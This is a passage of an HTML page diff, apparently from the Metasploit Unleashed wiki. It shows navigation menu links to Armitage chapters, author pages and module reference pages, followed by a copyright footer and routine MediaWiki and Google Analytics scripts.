+                                                                        <li><a href="Armitage_Setup">Armitage Setup</a></li>
+                                                                        <li><a href="Armitage_Scanning">Armitage Scanning</a></li>
+                                                                        <li><a href="Armitage_Exploitation">Armitage Exploitation</a></li>
+                                                                	<li><a href="Armitage_Post_Exploitation">Armitage Post Exploitation</a></li>
+								</ul>
+							</li>
+						</ul>
+					</div>
+				</li>
+				<li><a href="About_The_Authors" class="root">About The Authors</a>
+					<div class="menu two-column">
+						<h3>About the Authors</h3>
+						<ul class="one">
+							<li><a href="Mati_Aharoni">Mati Aharoni</a></li>
+							<li><a href="William_Coppola">William Coppola</a></li>
+							<li><a href="Paul_Hand">Paul Hand</a></li>
+							<li><a href="Alain_Hernandez">Alain Hernandez</a></li>
+							<li><a href="Devon_Kearns">Devon Kearns</a></li>
+							<li><a href="David_Kennedy">David Kennedy</a></li>
+							<li><a href="Steven_McElrea">Steven McElrea</a></li>
+							<li><a href="Matteo_Memelli">Matteo Memelli</a></li>
+							<li><a href="http://www.offensive-security.com/metasploit-unleashed/Jim_O'Gorman">Jim O'Gorman</a></li>
+							<li><a href="David_Ovitz">David Ovitz</a></li>
+							<li><a href="Carlos_Perez">Carlos Perez</a></li>
+						</ul>
+					</div>
+				</li>
+                                <li><a href="Post_Module_Reference" class="root">Post Module Reference</a>    
+                                        <div class="menu three-column">
+                                                <h3>Post Module Reference</h3>
+                                                <ul class="one">
+                                                        <li>Windows   
+                                                                <ul class="two">
+                                                                        <li><a href="Windows_Post_Capture_Modules">Capture</a></li>
+                                                                        <li><a href="Windows_Post_Gather_Modules">Gather</a></li>
+                                                                        <li><a href="Windows_Post_Manage_Modules">Manage</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Linux
+                                                                <ul class="two">
+                                                                        <li><a href="Linux_Post_Gather_Modules">Gather</a></li>
+                                                                </ul>
+								                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>OS X
+                                                                <ul class="two">
+                                                                        <li><a href="OS_X_Post_Gather_Modules">Gather</a></li>
+                                                                </ul>
+					                                			<div class="clear"></div>
+                                                        </li>
+                                                        <li>Multiple OS
+                                                                <ul class="two">
+                                                                        <li><a href="Multiple_OS_Post_Gather_Modules">Gather</a></li>
+                                                                        <li><a href="Multiple_OS_Post_General_Modules">General</a></li>
+                                                                </ul>
+							                                	<div class="clear"></div>
+                                                        </li>
+                                                </ul>
+                                        </div>
+                                </li>
+                                <li><a href="Auxiliary_Module_Reference" class="root">Auxiliary Module Reference</a>    
+                                        <div class="menu four-column">
+                                                <h3>Auxiliary Module Reference</h3>
+                                                <ul class="one">
+                                                        <li>Admin   
+                                                                <ul class="two">
+                                                                        <li><a href="Admin_HTTP_Auxiliary_Modules">HTTP</a></li>
+                                                                        <li><a href="Admin_MSSQL_Auxiliary_Modules">MSSQL</a></li>
+                                                                        <li><a href="Admin_MySQL_Auxiliary_Modules">MySQL</a></li>
+                                                                        <li><a href="Admin_Postgres_Auxiliary_Modules">Postgres</a></li>
+                                                                        <li><a href="Admin_VMWare_Auxiliary_Modules">VMWare</a></li>
+                                                                </ul>
+                                                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Scanner
+                                                                <ul class="two">
+                                                                        <li><a href="Scanner_DCERPC_Auxiliary_Modules">DCERPC</a></li>
+                                                                        <li><a href="Scanner_Discovery_Auxiliary_Modules">Discovery</a></li>
+                                                                        <li><a href="Scanner_FTP_Auxiliary_Modules">FTP</a></li>
+                                                                        <li><a href="Scanner_HTTP_Auxiliary_Modules">HTTP</a></li>
+                                                                        <li><a href="Scanner_IMAP_Auxiliary_Modules">IMAP</a></li>
+                                                                        <li><a href="Scanner_MSSQL_Auxiliary_Modules">MSSQL</a></li>
+                                                                        <li><a href="Scanner_MySQL_Auxiliary_Modules">MySQL</a></li>
+                                                                        <li><a href="Scanner_NetBIOS_Auxiliary_Modules">NetBIOS</a></li>
+                                                                        <li><a href="Scanner_POP3_Auxiliary_Modules">POP3</a></li>
+                                                                        <li><a href="Scanner_SMB_Auxiliary_Modules">SMB</a></li>
+                                                                        <li><a href="Scanner_SMTP_Auxiliary_Modules">SMTP</a></li>
+                                                                        <li><a href="Scanner_SNMP_Auxiliary_Modules">SNMP</a></li>
+                                                                        <li><a href="Scanner_SSH_Auxiliary_Modules">SSH</a></li>
+                                                                        <li><a href="Scanner_Telnet_Auxiliary_Modules">Telnet</a></li>
+                                                                        <li><a href="Scanner_TFTP_Auxiliary_Modules">TFTP</a></li>
+                                                                        <li><a href="Scanner_VMWare_Auxiliary_Modules">VMWare</a></li>
+                                                                        <li><a href="Scanner_VNC_Auxiliary_Modules">VNC</a></li>
+                                                                </ul>
+								                                <div class="clear"></div>
+                                                        </li>
+                                                        <li>Server
+                                                                <ul class="two">
+                                                                        <li><a href="Server_Capture_Auxiliary_Modules">Capture</a></li>
+                                                                </ul>
+					                                			<div class="clear"></div>
+                                                        </li>
+                                                </ul>
+                                        </div>
+                                </li>
+			<br />
+			<br />
+			<br />
+			<br />
+			</ul>
+													</div>
+				
+					<div class="clear"></div>
+				</div>
+
+				<div id="footer">
+					<div id="footer-content">
+						<div class="left">
+							Copyright &copy; 2013 Offensive Security Ltd. All rights reserved.
+						</div>
+						<div class="right">
+							<a href="http://www.offensive-security.com/"><img src="http://www.offensive-security.com/w/skins/msfu/offsec.png" alt="Offensive Security" /></a>
+						</div>
+						<div class="clear"></div>
+					</div>
+				</div>
+			
+		</div>
+<script>if(window.mw){
+mw.loader.state({"site":"loading","user":"missing","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.user","mediawiki.page.ready","mediawiki.searchSuggest"], null, true);
+}</script>
+<script src="http://www.offensive-security.com/w/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=msfu&amp;*"></script>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-1981501-1");
+pageTracker._trackPageview();
+</script><!-- Served in 0.143 secs. --></body></html>
